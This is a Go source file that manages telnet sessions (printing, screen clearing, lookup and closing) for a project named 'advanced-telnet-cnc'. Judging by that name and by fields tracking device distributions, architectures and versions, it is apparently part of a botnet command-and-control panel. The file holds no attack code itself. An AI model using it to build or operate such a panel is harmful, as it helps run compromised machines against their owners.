package sessions

import (
	"advanced-telnet-cnc/packages/telnetreader"
	term "advanced-telnet-cnc/packages/terminal"
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
	"fmt"
	"net"
	"strings"
	"time"
)

var (
	sessions = make(map[int]*Session)
)

type Session struct {
	ID int
	*database.UserProfile
	*telnetreader.Reader
	Term *term.Terminal
	net.Conn
	Created time.Time

	Theme *config.Theme

	OldDistribution map[string]int
	OldArches       map[string]int
	OldVersions     map[string]int

	LastCommand time.Time
}

func (s *Session) CmdError(err error) error {
	return s.Println("Command returned an error: \"\x1b[4;91m" + capitalizeFirstLetter(err.Error()) + "\x1b[0m\"")
}

func capitalizeFirstLetter(s string) string {
	if len(s) == 0 {
		return s
	}
	return strings.ToUpper(s[0:1]) + s[1:]
}

func Retrieve(name string) *Session {
	for _, s := range sessions {
		if s.UserProfile.Name == name {
			return s
		}
	}
	return nil
}

func Count() int {
	return len(sessions)
}

func Clone() []Session {
	var list []Session
	for _, session := range sessions {
		list = append(list, *session)
	}
	return list
}

func (session *Session) Print(a ...interface{}) error {
	_, err := session.Write([]byte(fmt.Sprint(a...)))
	return err
}

func (session *Session) Printf(format string, val ...any) error {
	_, err := session.Write([]byte(fmt.Sprintf(format, val...)))
	return err
}

func (session *Session) Println(a ...interface{}) error {
	_, err := session.Write([]byte(fmt.Sprint(a...) + "\r\n"))
	return err
}

func (session *Session) Clear() error {
	_, err := session.Write([]byte("\033c"))
	return err
}

func (session *Session) Close() {
	session.Conn.Close()
	session.Remove()
}
